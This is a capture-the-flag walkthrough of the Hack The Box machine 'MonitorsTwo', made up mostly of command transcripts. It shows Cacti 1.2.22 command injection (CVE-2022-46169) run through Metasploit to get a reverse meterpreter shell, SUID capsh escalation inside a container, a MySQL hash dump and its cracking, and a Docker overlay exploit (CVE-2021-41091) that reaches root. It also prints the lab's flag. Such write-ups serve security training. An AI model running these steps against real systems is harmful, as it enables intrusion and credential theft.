

# MonitorsTwo (Easy,Linux)

## Reconnaissance (Rustscan,Nmap)

To begin hacking the machine , first we need to know what services and ports are open. To know this we need to do some scanning techniques such as scanning tool or automation script. 

Every Red Teamer has own reconnaissance tool , I prefer using rustscan first to identify open ports (because it is extremely fast to find ports open) and then scanning them with nmap .

```bash
┌──(samurai㉿samurai)-[~/HTB/HTB-reports/Manual-WriteUps/MonitorsTwo]
└─$ rustscan -a 10.129.228.231 --ulimit 5000 
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
TreadStone was here 🚀

[~] The config file is expected to be at "/home/samurai/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.129.228.231:22
Open 10.129.228.231:80
[~] Starting Script(s)
[~] Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-25 21:45 +0400
Initiating Ping Scan at 21:45
Scanning 10.129.228.231 [4 ports]
Completed Ping Scan at 21:45, 0.19s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 21:45
Completed Parallel DNS resolution of 1 host. at 21:45, 0.50s elapsed
DNS resolution of 1 IPs took 0.50s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 21:45
Scanning 10.129.228.231 [2 ports]
Discovered open port 80/tcp on 10.129.228.231
Discovered open port 22/tcp on 10.129.228.231
Completed SYN Stealth Scan at 21:45, 0.19s elapsed (2 total ports)
Nmap scan report for 10.129.228.231
Host is up, received echo-reply ttl 63 (0.17s latency).
Scanned at 2026-03-25 21:45:05 +04 for 0s

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 1.01 seconds
           Raw packets sent: 6 (240B) | Rcvd: 3 (116B)
```


Perfect , we know the 22 and 80 ports are open and we will do some nmapping for identifying what services they run.

```bash
┌──(samurai㉿samurai)-[~/HTB/HTB-reports/Manual-WriteUps/MonitorsTwo]
└─$ nmap -A -p22,80 10.129.228.231                                  
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-25 21:45 +0400
Nmap scan report for 10.129.228.231
Host is up (0.23s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Login to Cacti
|_http-server-header: nginx/1.18.0 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   206.02 ms 10.10.14.1
2   206.15 ms 10.129.228.231

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.74 seconds
```

Here we know the common ssh port and a web service which runs on 80 port.

## Enumeration (80)

On browser , We see the login page which runs on Cacti Group and most important nuance is its version 1.2.22 

then we searching its known exploits 

```bash
┌──(samurai㉿samurai)-[~/HTB/HTB-reports/Manual-WriteUps/MonitorsTwo]
└─$ searchsploit cacti 1.2.22                                                           
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                              |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Cacti v1.2.22 - Remote Command Execution (RCE)                                                                                                              | php/webapps/51166.py
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
                      
```

Perfect . We have RCE PoC for this which refers to CVE-2022-46169 .

I used MetaSploit for getting shell but it depends on you whether to accomplish this by doing manually or some automation tool.

```bash
msf > search cacti

Matching Modules
================

   #   Name                                                    Disclosure Date  Rank       Check  Description
   -   ----                                                    ---------------  ----       -----  -----------
   0   exploit/linux/http/cacti_unauthenticated_cmd_injection  2022-12-05       excellent  Yes    Cacti 1.2.22 unauthenticated command injection
   1     \_ target: Automatic (Unix In-Memory)                 .                .          .      .
   2     \_ target: Automatic (Linux Dropper)                  .                .          .      .
   3   exploit/multi/http/cacti_package_import_rce             2024-05-12       excellent  Yes    Cacti Import Packages RCE
   4     \_ target: PHP                                        .                .          .      .
   5     \_ target: Linux Command                              .                .          .      .
   6     \_ target: Windows Command                            .                .          .      .
   7   exploit/multi/http/cacti_pollers_sqli_rce               2023-12-20       excellent  Yes    Cacti RCE via SQLi in pollers.php
   8     \_ target: Linux Command                              .                .          .      .
   9     \_ target: Windows Command                            .                .          .      .
   10  exploit/unix/http/cacti_filter_sqli_rce                 2020-06-17       excellent  Yes    Cacti color filter authenticated SQLi to RCE
   11  exploit/unix/webapp/cacti_graphimage_exec               2005-01-15       excellent  No     Cacti graph_view.php Remote Command Execution
   12  exploit/windows/http/hp_sitescope_runomagentcommand     2013-07-29       manual     Yes    HP SiteScope Remote Code Execution


Interact with a module by name or index. For example info 12, use 12 or use exploit/windows/http/hp_sitescope_runomagentcommand

msf > sue 0
[-] Unknown command: sue. Run the help command for more details.
msf > use 0
[*] Using configured payload linux/x86/meterpreter/reverse_tcp
msf exploit(linux/http/cacti_unauthenticated_cmd_injection) > options

Module options (exploit/linux/http/cacti_unauthenticated_cmd_injection):

   Name                Current Setting  Required  Description
   ----                ---------------  --------  -----------
   HOST_ID                              no        The host_id value to use. By default, the module will try to bruteforce this.
   LOCAL_DATA_ID                        no        The local_data_id value to use. By default, the module will try to bruteforce this.
   Proxies                              no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: sapni, socks4, socks5, socks5h, http
   RHOSTS                               yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT               8080             yes       The target port (TCP)
   SSL                 false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                              no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI           /                yes       The base path to Cacti
   URIPATH                              no        The URI to use for this exploit (default is random)
   VHOST                                no        HTTP server virtual host
   X_FORWARDED_FOR_IP  127.0.0.1        yes       The IP to use in the X-Forwarded-For HTTP header. This should be resolvable to a hostname in the poller table.


   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT  8080             yes       The local port to listen on.

s
Payload options (linux/x86/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   1   Automatic (Linux Dropper)



View the full module info with the info, or info -d command.

```

As you can see , we are prepared to exploit this vulnerability.

## Exploitation

```bash
msf exploit(linux/http/cacti_unauthenticated_cmd_injection) > set rhosts 10.129.228.231
rhosts => 10.129.228.231
msf exploit(linux/http/cacti_unauthenticated_cmd_injection) > set rport 80
rport => 80
msf exploit(linux/http/cacti_unauthenticated_cmd_injection) > set lhost tun0
lhost => 10.10.14.88
msf exploit(linux/http/cacti_unauthenticated_cmd_injection) > run
[*] Started reverse TCP handler on 10.10.14.88:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. The target is Cacti version 1.2.22
[*] Trying to bruteforce an exploitable host_id and local_data_id by trying up to 500 combinations
[*] Enumerating local_data_id values for host_id 1
[+] Found exploitable local_data_id 6 for host_id 1
[*] Command Stager progress - 100.00% done (1118/1118 bytes)
[*] Exploit completed, but no session was created.
msf exploit(linux/http/cacti_unauthenticated_cmd_injection) > run
[*] Started reverse TCP handler on 10.10.14.88:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. The target is Cacti version 1.2.22
[*] Trying to bruteforce an exploitable host_id and local_data_id by trying up to 500 combinations
[*] Enumerating local_data_id values for host_id 1
[+] Found exploitable local_data_id 6 for host_id 1
[*] Command Stager progress - 100.00% done (1118/1118 bytes)
[*] Sending stage (1062760 bytes) to 10.129.228.231
[*] Meterpreter session 1 opened (10.10.14.88:4444 -> 10.129.228.231:54628) at 2026-03-25 21:53:58 +0400

meterpreter > 

```


## Local Enumeration

inside the machine , we will do some common techniques . Let's do SUID hunting 

```bash
www-data@50bca5e748b0:~/html/include$ find / -perm /4000 2>/dev/null
find / -perm /4000 2>/dev/null
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/newgrp
/sbin/capsh
/bin/mount
/bin/umount
/bin/su
```

We see /sbin/capsh file which is neither normal nor default.

lets find out its capability for privilege escalation

## Privilege Escalation (Docker)

in GTFOBins , we found --> capsh --gid=0 --uid=0 --

and boom we are root on docker , But it is not enough for us because we are on docker. Now we have move laterally. After reserching machine we found mysql credentials on include/config.php file . which is root:root

```bash
root@50bca5e748b0:/root# mysql -h db -u root -p cacti -e 'select * from user_auth'
<-h db -u root -p cacti -e 'select * from user_auth'
bash: rmysql: command not found
root@50bca5e748b0:/root# mysql -h db -u root -p cacti -e 'select * from user_auth'
<-h db -u root -p cacti -e 'select * from user_auth'
Enter password: root
id	username	password	realm	full_name	email_address	must_change_password	password_change	show_tree	show_list	show_preview	graph_settings	login_opts	policy_graphs	policy_trees	policy_hosts	policy_graph_templates	enabled	lastchange	lastlogin	password_history	locked	failed_attempts	lastfail	reset_perms
1	admin	$2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC	0	Jamie Thompson	admin@monitorstwo.htb		on	on	on	on	on	2	1	11	1	on	-1	-1	-1		0	0	663348655
3	guest	43e9a4ab75570f5b	0	Guest Account		on	on	on	on	on	3	1	1	1	1	1		-1	-1	-1	00	0
4	marcus	$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C	0	Marcus Brune	marcus@monitorstwo.htb			on	on	on	on	1	1	11	1	on	-1	-1		on	0	0	2135691668
root@50bca5e748b0:/root# 
```

and now it is time for cracking these hashes for getting access with SSH 

```bash
┌──(samurai㉿samurai)-[~/HTB/HTB-reports/Manual-WriteUps/MonitorsTwo]
└─$ john marcus_password.hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
funkymonkey      (?)     
1g 0:00:00:32 DONE (2026-03-25 22:30) 0.03073g/s 262.2p/s 262.2c/s 262.2C/s nautica..coucou
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

and we have marcus user's plaintext password 

## Privilege Escalation (Local machine)

we found a mail to marcus user on /var/mail : 
```bash
marcus@monitorstwo:~$ cat /var/mail/marcus 
From: administrator@monitorstwo.htb
To: all@monitorstwo.htb
Subject: Security Bulletin - Three Vulnerabilities to be Aware Of

Dear all,

We would like to bring to your attention three vulnerabilities that have been recently discovered and should be addressed as soon as possible.

CVE-2021-33033: This vulnerability affects the Linux kernel before 5.11.14 and is related to the CIPSO and CALIPSO refcounting for the DOI definitions. Attackers can exploit this use-after-free issue to write arbitrary values. Please update your kernel to version 5.11.14 or later to address this vulnerability.

CVE-2020-25706: This cross-site scripting (XSS) vulnerability affects Cacti 1.2.13 and occurs due to improper escaping of error messages during template import previews in the xml_path field. This could allow an attacker to inject malicious code into the webpage, potentially resulting in the theft of sensitive data or session hijacking. Please upgrade to Cacti version 1.2.14 or later to address this vulnerability.

CVE-2021-41091: This vulnerability affects Moby, an open-source project created by Docker for software containerization. Attackers could exploit this vulnerability by traversing directory contents and executing programs on the data directory with insufficiently restricted permissions. The bug has been fixed in Moby (Docker Engine) version 20.10.9, and users should update to this version as soon as possible. Please note that running containers should be stopped and restarted for the permissions to be fixed.

We encourage you to take the necessary steps to address these vulnerabilities promptly to avoid any potential security breaches. If you have any questions or concerns, please do not hesitate to contact our IT department.

Best regards,

Administrator
CISO
Monitor Two
Security Team
marcus@monitorstwo:~$ 

```

The most interesting one to us is clearly CVE-2021-33033 and CVE-2021-41091 which is a way to root !!

But I tried kernel exploit many times and researched it , unfortunately failed. 

Now i switched to CVE-2021-41091 researching and i found its PoC from https://github.com/UncleJ4ck/CVE-2021-41091/blob/main/exp.sh

By sending it to target and executing it but when running it , It asked me adding suid byte to /bin/bash on docker and i did that 

Of course , we have to be ready for errors but one succeded 

```bash
marcus@monitorstwo:~$ ./exp.sh 
[!] Vulnerable to CVE-2021-41091
[!] Now connect to your Docker container that is accessible and obtain root access !
[>] After gaining root access execute this command (chmod u+s /bin/bash)

Did you correctly set the setuid bit on /bin/bash in the Docker container? (yes/no): yes
[!] Available Overlay2 Filesystems:
/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged
/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged

[!] Iterating over the available Overlay2 filesystems !
[?] Checking path: /var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged
[x] Could not get root access in '/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged'

[?] Checking path: /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
[!] Rooted !
[>] Current Vulnerable Path: /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
[?] If it didn't spawn a shell go to this path and execute './bin/bash -p'

[!] Spawning Shell
bash-5.1# exit
marcus@monitorstwo:~$ ./bin/bash -p
-bash: ./bin/bash: No such file or directory
marcus@monitorstwo:~$ ls -la /bin/bash
-rwxr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
marcus@monitorstwo:~$ cd /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
marcus@monitorstwo:/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged$ ./bin/bash -p
bash-5.1# whoami
root
bash-5.1# cd /root
bash-5.1# ls
cacti  root.txt
bash-5.1# cat root.txt 
ad143251d0b10018b2993a0c550d332d
bash-5.1# 

```

And here is the Privilege Escalation ending. 

Thanks for Reading).
